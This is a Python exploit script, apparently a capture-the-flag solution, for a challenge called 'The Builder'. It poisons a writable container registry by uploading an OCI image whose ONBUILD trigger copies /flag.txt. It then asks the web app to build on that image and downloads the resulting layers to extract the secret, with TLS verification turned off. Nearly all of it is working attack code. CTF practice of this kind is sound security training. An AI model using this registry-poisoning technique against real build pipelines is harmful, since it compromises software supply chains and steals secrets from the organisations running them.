#!/usr/bin/env python3
"""Exploit The Builder's trusted, writable page-image registry."""

from __future__ import annotations

import gzip
import hashlib
import io
import json
import os
import re
import ssl
import tarfile
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request, urlopen


WEB_URL = os.environ.get(
    "WEB_URL", "https://the-builder-985bf087a429.chall.nnsc.tf"
).rstrip("/")
REGISTRY_URL = os.environ.get(
    "REGISTRY_URL", "https://the-builder-registry-985bf087a429.chall.nnsc.tf"
).rstrip("/")
PAGE_CONTENT = "x"
PAGE_LOCATION = "flag.txt"
REGISTRY_REPO = "pages"
FLAG_RE = re.compile(rb"(?:FLAG|NNS)\{[^}\r\n]{1,200}\}")
TLS_CONTEXT = ssl._create_unverified_context()


def page_tag(content: str) -> str:
    """Return the twelve-character page tag used by the builder."""

    return hashlib.sha256(content.encode("utf-8")).hexdigest()[:12]


def manifest_layers(manifest: dict) -> list[str]:
    """Return layer digests from either common Docker manifest format."""

    if manifest.get("layers"):
        return [layer["digest"] for layer in manifest["layers"]]
    return [layer["blobSum"] for layer in manifest.get("fsLayers", [])]


def extract_flag(data: bytes) -> str | None:
    """Extract a CTF flag from a registry blob or its tar members."""

    candidates = [data]
    try:
        with tarfile.open(fileobj=io.BytesIO(data), mode="r:*") as archive:
            candidates.extend(
                member_file.read()
                for member_file in (
                    archive.extractfile(member)
                    for member in archive
                    if member.isfile()
                )
                if member_file is not None
            )
    except (tarfile.ReadError, EOFError, OSError):
        pass

    for candidate in candidates:
        match = FLAG_RE.search(candidate)
        if match:
            return match.group(0).decode("utf-8")
    return None


def _page_layer() -> tuple[bytes, bytes]:
    """Create an OCI layer containing the placeholder page file."""

    uncompressed = io.BytesIO()
    with tarfile.open(fileobj=uncompressed, mode="w") as archive:
        page = PAGE_CONTENT.encode("utf-8")
        info = tarfile.TarInfo("page")
        info.mode = 0o644
        info.size = len(page)
        info.mtime = 0
        archive.addfile(info, io.BytesIO(page))

    raw_layer = uncompressed.getvalue()
    return raw_layer, gzip.compress(raw_layer, mtime=0)


def page_image() -> tuple[bytes, bytes, dict]:
    """Build a page image whose ONBUILD trigger copies the secret."""

    raw_layer, compressed_layer = _page_layer()
    config = {
        "architecture": "amd64",
        "os": "linux",
        "config": {"OnBuild": ["COPY --from=theme /flag.txt /page"]},
        "rootfs": {
            "type": "layers",
            "diff_ids": ["sha256:" + hashlib.sha256(raw_layer).hexdigest()],
        },
        "history": [{"created_by": "the builder"}],
    }
    config_bytes = json.dumps(config, separators=(",", ":")).encode("utf-8")
    config_digest = "sha256:" + hashlib.sha256(config_bytes).hexdigest()
    layer_digest = "sha256:" + hashlib.sha256(compressed_layer).hexdigest()
    manifest = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {
            "mediaType": "application/vnd.oci.image.config.v1+json",
            "digest": config_digest,
            "size": len(config_bytes),
        },
        "layers": [
            {
                "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
                "digest": layer_digest,
                "size": len(compressed_layer),
            }
        ],
    }
    return config_bytes, compressed_layer, manifest


def _http(
    method: str,
    url: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    expected: tuple[int, ...] = (200,),
) -> tuple[int, dict[str, str], bytes]:
    request = Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urlopen(request, context=TLS_CONTEXT, timeout=30) as response:
            body = response.read()
            result = (response.status, dict(response.headers), body)
    except HTTPError as error:
        body = error.read()
        if error.code in expected:
            return error.code, dict(error.headers), body
        detail = body.decode("utf-8", errors="replace")[:400]
        raise RuntimeError(f"{method} {url} returned {error.code}: {detail}") from error
    except URLError as error:
        raise RuntimeError(f"{method} {url} failed: {error.reason}") from error

    if result[0] not in expected:
        detail = result[2].decode("utf-8", errors="replace")[:400]
        raise RuntimeError(f"{method} {url} returned {result[0]}: {detail}")
    return result


def _blob_url(repo: str, digest: str) -> str:
    return f"{REGISTRY_URL}/v2/{quote(repo, safe='/')}/blobs/{digest}"


def _upload_blob(repo: str, payload: bytes, digest: str) -> None:
    status, _, _ = _http("HEAD", _blob_url(repo, digest), expected=(200, 404))
    if status == 200:
        return

    _, headers, _ = _http(
        "POST",
        f"{REGISTRY_URL}/v2/{quote(repo, safe='/')}/blobs/uploads/",
        expected=(202,),
    )
    location = headers.get("Location")
    if not location:
        raise RuntimeError("registry did not return a blob-upload location")
    location = urljoin(REGISTRY_URL + "/", location)
    split = urlsplit(location)
    query = split.query + ("&" if split.query else "") + urlencode({"digest": digest})
    location = urlunsplit((split.scheme, split.netloc, split.path, query, split.fragment))
    _http(
        "PUT",
        location,
        data=payload,
        headers={"Content-Type": "application/octet-stream"},
        expected=(201,),
    )


def poison_page_image() -> str:
    """Publish the ONBUILD page image before the builder resolves its tag."""

    config_bytes, compressed_layer, manifest = page_image()
    repo = REGISTRY_REPO
    _upload_blob(
        repo,
        config_bytes,
        manifest["config"]["digest"],
    )
    _upload_blob(
        repo,
        compressed_layer,
        manifest["layers"][0]["digest"],
    )
    tag = page_tag(PAGE_CONTENT)
    manifest_bytes = json.dumps(manifest, separators=(",", ":")).encode("utf-8")
    _http(
        "PUT",
        f"{REGISTRY_URL}/v2/{repo}/manifests/{tag}",
        data=manifest_bytes,
        headers={"Content-Type": "application/vnd.oci.image.manifest.v1+json"},
        expected=(201,),
    )
    return tag


def create_build() -> str:
    """Ask the web application to build and push the poisoned page."""

    form = urlencode(
        [("location", PAGE_LOCATION), ("content", PAGE_CONTENT)]
    ).encode("utf-8")
    _, _, body = _http(
        "POST",
        f"{WEB_URL}/api/builds",
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        expected=(200,),
    )
    result = json.loads(body)
    build_id = result.get("id")
    if not isinstance(build_id, str) or not re.fullmatch(r"[0-9a-f]{12}", build_id):
        raise RuntimeError(f"unexpected build response: {result!r}")
    return build_id


def retrieve_flag(build_id: str) -> str:
    """Download the pushed image's layers and locate the copied secret."""

    repo = f"sites/{build_id}"
    manifest_url = f"{REGISTRY_URL}/v2/{repo}/manifests/latest"
    _, _, body = _http(
        "GET",
        manifest_url,
        headers={
            "Accept": ", ".join(
                (
                    "application/vnd.oci.image.manifest.v1+json",
                    "application/vnd.docker.distribution.manifest.v2+json",
                    "application/vnd.docker.distribution.manifest.v1+json",
                )
            )
        },
        expected=(200,),
    )
    manifest = json.loads(body)
    for digest in reversed(manifest_layers(manifest)):
        _, _, layer = _http("GET", _blob_url(repo, digest), expected=(200,))
        flag = extract_flag(layer)
        if flag:
            return flag
    raise RuntimeError("no FLAG{...} value found in the pushed image")


def solve() -> str:
    """Run the exploit and save the recovered flag in the challenge root."""

    tag = poison_page_image()
    print(f"[*] Poisoned pages:{tag} with an ONBUILD secret copy")
    build_id = create_build()
    print(f"[*] Built sites/{build_id}:latest")
    flag = retrieve_flag(build_id)
    flag_path = Path(__file__).resolve().parents[1] / "flag.txt"
    flag_path.write_text(flag + "\n", encoding="utf-8")
    print(f"[+] Flag: {flag}")
    print(f"[+] Saved to {flag_path}")
    return flag


if __name__ == "__main__":
    solve()
